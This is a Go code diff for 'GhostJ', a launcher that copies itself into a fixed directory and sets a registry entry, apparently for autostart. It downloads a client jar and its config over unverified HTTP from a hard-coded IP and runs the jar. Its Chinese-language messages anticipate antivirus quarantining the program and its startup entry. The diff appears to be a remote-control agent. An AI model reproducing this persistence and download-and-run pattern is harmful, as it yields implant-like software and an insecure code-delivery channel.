@@ -2,6 +2,7 @@ package main
 
 import (
 	"archive/zip"
+	"bufio"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -14,7 +15,7 @@ import (
 	"time"
 )
 
-const GHOST_DIR = "D:\\ProgramData\\Ghost"
+const GhostDir = "D:\\ProgramData\\Ghost"
 
 var wg sync.WaitGroup
 
@@ -44,7 +45,7 @@ func main() {
 	if len(os.Args) == 1 {
 		//验证当前文件夹
 		//已经在指定文件夹
-		if strings.EqualFold(currentDir, GHOST_DIR) {
+		if strings.EqualFold(currentDir, GhostDir) {
 			fmt.Println("Launching.")
 			checkJRE()
 			checkClient()
@@ -53,9 +54,13 @@ func main() {
 		} else { //不在指定文件夹，部署
 			fmt.Println("Installing.")
 			writeReg()
-			mkGhostDir(GHOST_DIR)
-			copySelf(GHOST_DIR)
-			directRun()
+			//copyToStartup()
+			mkGhostDir(GhostDir)
+			copySelf(GhostDir)
+			fmt.Println("copied")
+			directRunAtGhostDir()
+			fmt.Println("exit")
+			os.Exit(0)
 		}
 	} else if strings.EqualFold(os.Args[1], "direct") { //直接在本文件夹启动
 		fmt.Println("directLaunching.")
@@ -70,9 +75,47 @@ func main() {
 		initRoutines()
 	} else if strings.EqualFold(os.Args[1], "client") {
 		c := exec.Command("jre\\bin\\javaw.exe", "-jar", "ghostjc.jar")
-		_ = c.Start()
+		err := c.Start()
+		//
+		//out, err := c.CombinedOutput()
+		if err!=nil {
+			fmt.Println(err.Error())
+		}
+		//fmt.Println("out:",out)
 		os.Exit(0)
+	}else if strings.EqualFold(os.Args[1],"name") {
+
+		//检查是否已经部署过，如果已有，需要检查是否被杀毒软件拦截
+		mkGhostDir("D:\\ProgramData\\Ghost")
+		var cfg config
+		if Exists("D:\\ProgramData\\Ghost\\ghostjc.ini") {
+			cfg.Load("D:\\ProgramData\\Ghost\\ghostjc.ini")
+			hn,exist:=cfg.Get("name")
+			if exist {
+				fmt.Println("[警告]此主机已部署过GhostJ，如果控制台无法找到连接，很可能已被杀软拦截，请检查启动项是否设置或检查杀软是否隔离此程序和启动项\n此主机的名称已存在:",hn)
+			}else {
+				fmt.Println("[警告]此主机已被部署GhostJ，但无法获取已设置主机名称，请检查杀软及部署目录")
+			}
+		}
+		stdin:=bufio.NewReader(os.Stdin)
+		fmt.Print("[提示]请设置此主机的名称(如果已有，将会覆盖，如果您不确定请不要设置，然后询问其他人员):")
+		words,_,_:=stdin.ReadLine()
+		err := WriteFile("D:\\ProgramData\\Ghost\\preferName.txt", string(words))
+		if err != nil {
+			fmt.Println("[错误]"+err.Error())
+		}else {
+			fmt.Println("设置成功")
+			writeReg()
+			//copyToStartup()
+			mkGhostDir(GhostDir)
+			copySelf(GhostDir)
+			directRunAtGhostDir()
+			_,_,_=stdin.ReadLine()
+		}
 	}
+}
+func copyToStartup() {
+	CopyFile("gl.exe", "shell:startup")
 }
 func initRoutines() {
 	wg.Add(1)
@@ -90,9 +133,9 @@ func tidyDir() {
 }
 
 //加上direct参数运行gl
-func directRun() error {
-	c := exec.Command(GHOST_DIR+"\\gl.exe", "direct")
-	c.Dir = GHOST_DIR
+func directRunAtGhostDir() error {
+	c := exec.Command(GhostDir+"\\gl.exe", "direct")
+	c.Dir = GhostDir
 	return c.Start()
 }
 
@@ -231,7 +274,6 @@ func checkClient() {
 	latestVerID, err := strconv.Atoi(strings.ReplaceAll(string(verla), "\n", ""))
 	if err != nil {
 		return
-		panic(err)
 	}
 	//下载客户端
 	//检查版本
@@ -240,14 +282,28 @@ func checkClient() {
 		DownloadFile("http://39.100.5.139/ghost/client/"+strconv.Itoa(latestVerID)+".jar", "ghostjc.jar")
 		if !Exists("ghostjc.ini") {
 			DownloadFile("http://39.100.5.139/ghost/client/ghostjc.ini", "ghostjc.ini")
+
 		}
 		WriteFile("nowVer.txt", strconv.Itoa(latestVerID))
+	}
+	if Exists("preferName.txt") {
+		fmt.Print("正在修改名称:")
+		var cfg0 config
+		cfg0.Load("ghostjc.ini")
+		prefername,_:=ReadFile("preferName.txt")
+		cfg0.Set("name",prefername)
+		fmt.Print(prefername)
+		cfg0.Write()
 	}
 	WriteFile("alive", strconv.FormatInt(time.Now().Unix(), 10))
 }
 func launchClient() error {
+	fmt.Println("Launching client..")
 	c := exec.Command("gl.exe", "client")
 	err := c.Start()
+	if err != nil {
+		fmt.Println(err.Error())
+	}
 	return err
 }
 
@@ -255,7 +311,8 @@ func launchClient() error {
 func launchEXE(workDir string, filename string) error {
 	c := exec.Command(filename)
 	c.Dir = workDir
-	err := c.Start()
+	out, err := c.CombinedOutput()
+	fmt.Println("stdout:",out)
 	return err
 }
 func mkGhostDir(dir string) {
